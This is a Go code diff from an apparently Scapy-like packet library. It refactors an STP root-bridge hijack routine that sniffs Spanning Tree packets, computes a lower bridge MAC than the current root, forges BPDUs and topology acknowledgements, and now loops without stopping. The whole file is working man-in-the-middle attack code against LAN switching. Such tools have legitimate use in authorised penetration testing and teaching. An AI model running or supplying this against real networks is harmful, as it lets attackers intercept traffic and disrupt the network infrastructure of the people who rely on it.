@@ -3,40 +3,27 @@ package higherlevel
 import (
 	"fmt"
 	"github.com/tiagomdiogo/ScaGo/packet"
-	"github.com/tiagomdiogo/ScaGo/supersocket"
+	communication "github.com/tiagomdiogo/ScaGo/supersocket"
 	"github.com/tiagomdiogo/ScaGo/utils"
 	"log"
 	"strconv"
 	"strings"
-	"time"
 )
 
 func StpRootBridgeMitM(iface1 string) {
 
-	ss, err := supersocket.NewSuperSocket(iface1, "")
-	if err != nil {
-		log.Fatal(err)
-	}
-
 	for {
-		pkt, err := ss.Recv()
-		if err != nil {
-			log.Fatal(err)
-		}
-
+		pkt := communication.Recv(iface1)
 		stpLayer := utils.GetSTPLayer(pkt)
-		if stpLayer != nil {
-			fmt.Println("Received an STP packet")
+
+		if stpLayer == nil {
+			continue
 		}
 
 		rootString := stpLayer.RouteID.HwAddr.String()
 		rootStringAux := strings.ReplaceAll(rootString, ":", "")
-		rootInt, err := strconv.ParseInt(rootStringAux, 16, 64)
-		if err != nil {
-			log.Fatal(err)
-		}
+		rootInt, _ := strconv.ParseInt(rootStringAux, 16, 64)
 		rootInt -= 1
-
 		rootMacHex := fmt.Sprintf("%012x", rootInt)
 		parts := make([]string, 0, 6)
 		for i := 0; i < len(rootMacHex); i += 2 {
@@ -52,16 +39,10 @@ func StpRootBridgeMitM(iface1 string) {
 		}
 
 		stpRootBridgeHijack(iface1, params)
-		time.Sleep(10 * time.Second)
 	}
 }
 
 func stpRootBridgeHijack(iface string, params map[string]interface{}) {
-
-	ss, err := supersocket.NewSuperSocket(iface, "")
-	if err != nil {
-		log.Fatal(err)
-	}
 
 	rootID := params["rootid"].(uint16)
 	bridgeID := params["bridgeid"].(uint16)
@@ -82,19 +63,12 @@ func stpRootBridgeHijack(iface string, params map[string]interface{}) {
 	stpLayer.SetBridgeMacStr(bridgeMAC)
 	stpLayer.SetBridgeID(bridgeID)
 
-	pkt, err := packet.CraftPacket(Dot3Layer.Layer(), LLCLayer.Layer(), stpLayer.Layer())
-
-	ss.Send(pkt)
+	pkt, _ := packet.CraftPacket(Dot3Layer.Layer(), LLCLayer.Layer(), stpLayer.Layer())
 
 	for {
-		pkt, err := ss.Recv()
-		if err != nil {
-			log.Fatal(err)
-		}
+		pkt2 := communication.SendRecv(pkt, iface)
 
-		// Parse the packet
-		stpResponse := utils.GetSTPLayer(pkt)
-
+		stpResponse := utils.GetSTPLayer(pkt2)
 		if stpResponse != nil {
 			Dot3Layer := packet.Dot3Layer()
 			Dot3Layer.SetDstMAC("01:80:c2:00:00:00")
@@ -114,9 +88,7 @@ func stpRootBridgeHijack(iface string, params map[string]interface{}) {
 			if err != nil {
 				log.Fatal(err)
 			}
-			ss.Send(finalAck)
-			fmt.Println("Sent the topology acknowledge")
-			return
+			communication.Send(finalAck, iface)
 		}
 	}
 }
